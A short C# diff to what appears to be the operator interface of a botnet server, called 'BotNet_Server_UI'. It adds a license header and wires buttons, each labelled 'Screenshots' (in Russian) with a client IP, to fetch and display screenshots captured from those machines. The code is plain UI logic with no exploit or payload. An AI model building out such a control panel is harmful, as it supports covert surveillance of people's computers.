@@ -1,4 +1,6 @@
-﻿using System;
+﻿// This code is licensed under the isc license. You can improve the code by keeping this comments 
+// (or by any other means, with saving authorship by Zerumi and PizhikCoder retained)
+using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
@@ -45,6 +47,7 @@ namespace BotNet_Server_UI
             {
                 buttons.Add(new Button()
                 {
+                    Name = "" + ip[i].id,
                     Content = "Скриншоты " + ip[i].ip
                 });
                 buttons[i].Click += Screens_Click;
@@ -52,9 +55,13 @@ namespace BotNet_Server_UI
             }
         }
 
-        private void Screens_Click(object sender, RoutedEventArgs e)
+        private async void Screens_Click(object sender, RoutedEventArgs e)
         {
-
+            var element = e.OriginalSource as FrameworkElement;
+            var name = element?.Name;
+            var screen = await ApiRequest.GetProductAsync<Screen>("/api/v1/screens/" + name);
+            ScreenBox screenBox = new ScreenBox(screen.bytes);
+            screenBox.Show();
         }
     }
 }
